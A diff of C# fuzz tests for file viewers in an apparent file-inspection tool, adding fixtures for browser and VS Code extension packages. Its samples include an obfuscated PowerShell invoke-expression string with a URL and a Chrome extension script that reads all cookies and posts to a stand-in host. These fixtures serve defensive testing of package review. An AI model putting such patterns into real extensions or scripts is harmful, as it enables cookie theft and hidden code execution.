@@ -85,6 +85,17 @@ public sealed class FileViewFuzzTests : IDisposable
         Encoding.UTF8.GetBytes("& ( $PSHomE[4]+$pShome[34]+'x') (('1wb'+'u = 7Xkhttp://'+'ex'+'ample.com/cor'+'vus7Xk').REPLAce(([ChAR]49+[ChAR]119+[ChAR]98),'$').REPLAce('7Xk',[String][ChAR]39))"));
 
     [Fact]
+    [FuzzEntry(typeof(PackageFileView), typeof(Corvus.Services.Web.Packages.CrxHeader))]
+    public void Package()
+    {
+        var zip = ContainerFixtures.Zip(("manifest.json", Encoding.UTF8.GetBytes("""{"manifest_version":3,"name":"x","version":"1","permissions":["cookies"],"host_permissions":["<all_urls>"],"background":{"service_worker":"b.js"}}""")),
+            ("b.js", Encoding.UTF8.GetBytes("chrome.cookies.getAll({}, c => fetch('https://a.example/c', {method:'POST'}));")));
+        Fuzz(new PackageFileView(), "ext.crx", 150, PackageReviewTests.Crx3(zip, out _));
+        Fuzz(new PackageFileView(), "pkg.vsix", 150, ContainerFixtures.Zip(("extension/package.json", Encoding.UTF8.GetBytes("""{"name":"a","publisher":"b","main":"./e.js","activationEvents":["*"]}""")),
+            ("extension/e.js", Encoding.UTF8.GetBytes("exports.activate=()=>{}"))));
+    }
+
+    [Fact]
     [FuzzEntry(typeof(SqliteRecoverFileView))]
     public void SqliteRecover() => Fuzz(new SqliteRecoverFileView(), "msg.db", 300,
         NativeSqlite.Build("CREATE TABLE msg(id INTEGER PRIMARY KEY, body TEXT);", "INSERT INTO msg(body) VALUES ('one'), ('two'), ('three');", "DELETE FROM msg WHERE id = 2;"));
